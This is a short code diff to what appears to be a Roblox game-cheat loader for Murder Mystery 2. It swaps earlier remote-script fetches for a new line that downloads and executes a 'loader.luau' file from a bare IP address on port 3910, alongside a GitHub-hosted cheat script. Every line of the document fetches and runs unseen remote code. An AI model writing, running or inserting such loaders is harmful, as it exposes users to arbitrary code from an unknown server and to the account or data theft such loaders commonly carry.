@@ -1,2 +1,4 @@
-loadstring(game:HttpGet("https://pastefy.app/2DTkNKca/raw"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/renardofficiel/game/refs/heads/main/MurderMystery2/main.lua", true))()
+ID="4c78314a-bc55-43c0-9947-1c9db37afdab"
+RUN_AFTER=loadstring(game:HttpGet("https://raw.githubusercontent.com/renardofficiel/game/refs/heads/main/MurderMystery2/main.lua", true))()
+
+loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
